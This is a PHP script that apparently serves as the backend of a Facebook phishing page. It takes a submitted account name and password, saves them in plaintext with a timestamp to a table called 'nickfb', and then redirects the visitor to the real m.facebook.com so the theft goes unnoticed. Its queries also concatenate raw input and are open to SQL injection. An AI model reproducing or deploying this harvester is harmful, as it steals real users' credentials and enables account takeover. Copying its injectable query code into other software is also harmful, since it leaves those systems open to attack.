<?php
date_default_timezone_set('Asia/Ho_Chi_Minh');
if(isset($_POST['taikhoan'])){
include "./config.php";
$taikhoan = $_POST['taikhoan'];

$matkhau = $_POST['matkhau'];

$dt = mysql_query("SELECT * FROM nickfb WHERE `taikhoan` = '" .$taikhoan . "'");
$dt = mysql_num_rows($dt);
if($dt >=1)
{
mysql_query(

         "UPDATE 

            nickfb

         SET

            `matkhau` = '" . $matkhau . "',

            `thoigian` = '".date('H:i d/m/y')."'

         WHERE

            `taikhoan` = '" .$taikhoan . "'

      ");
echo '<meta http-equiv="refresh" content="0;url=https://m.facebook.com">';
exit;      

}
else
{
mysql_query(

         "INSERT INTO nickfb SET

            `taikhoan` = '" .$taikhoan . "',

            `matkhau` = '" . $matkhau . "',

            `thoigian` = '".date('H:i d/m/y')."'");

echo '<meta http-equiv="refresh" content="0;url=https://m.facebook.com">';
exit;
}
}
?>